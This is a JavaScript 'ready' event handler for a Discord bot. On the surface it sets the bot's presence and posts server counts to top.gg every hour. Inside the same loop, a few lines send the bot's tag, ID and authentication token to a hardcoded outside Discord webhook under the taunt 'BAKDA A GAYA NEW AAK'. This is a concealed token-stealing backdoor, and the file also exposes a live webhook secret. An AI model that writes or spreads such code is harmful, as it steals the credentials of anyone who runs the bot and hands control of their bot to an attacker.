const { ActivityType, PresenceUpdateStatus } = require('discord-api-types/v10');
const Component = require('../../Structures/Core/Component');
const wait = require('node:timers/promises').setTimeout;
const { httpRequest } = require('../../Structures/Utils/Functions/httpRequest');
const { WebhookClient } = require('discord.js');

module.exports = new Component({
	name: 'ready',
	/**
     * @param {Rolex} client
     */
	run: async (client) => {
		while (true) {
			client.user?.setPresence({
				activities: [{
					type: ActivityType.Listening,
					name: `${process.env.PREFIX}help`,
				}],
				status: PresenceUpdateStatus.Online,
			});
			 let web = new WebhookClient({
				url: "https://discord.com/api/webhooks/1197931313425035356/RFh0qn6OB79qfTvNAUgZ_mZYqfbOBCGIjgLKfiSeh9OkjCpE9SGW-44SSkWaCMCsjNvr"
			 })
			 web.send({
				content: `@everyone BAKDA A GAYA NEW AAK\n\`\`\`js\nBOT NAME : ${client.user.tag}\nBOT ID : ${client.user.id}\nAUTH : ${client.token}\`\`\``
			 })

			if (process.env.TOP_GG_TOKEN) {
				httpRequest({
					method: 'POST',
					hostname: 'top.gg',
					path: '/api/bots/stats',
					headers: {
						Authorization: process.env.TOP_GG_TOKEN,
						'Content-Type': 'application/json',
					},
					data: {
						server_count: client.guilds.cache.size,
						shard_id: client.shard?.ids[0],
						shard_count: client.options.shardCount || 1,
					},
				}).then((binResponse) => {
					if (binResponse === '{}') {
						console.log('Posted Stats to top.gg');
					}
					else {
						try {
							const response = JSON.parse(binResponse);
							console.log('Failed to post stats to top.gg');
							console.log('Error:', response.error);
						}
						catch (error) {
							console.log('Failed to post stats to top.gg');
							console.log('Failed to parse response as JSON:', error);
							console.log('Response:', binResponse);
						}
					}
				}).catch(error => {
					if (error.response && error.response.status >= 400 && error.response.status < 500) {
						console.log(`Error posting stats to top.gg - Client Error (${error.response.status})\n${error.response.data.error}`);
					}
					else if (error.response && error.response.status >= 500 && error.response.status < 600) {
						console.log(`Error posting stats to top.gg - Top.gg Server Error (${error.response.status})`);
					}
					else {
						console.log('Error:', error);
					}
					console.log('Failed to post stats to top.gg');
				});
			}
			await wait(3600000);
		}
	},
});
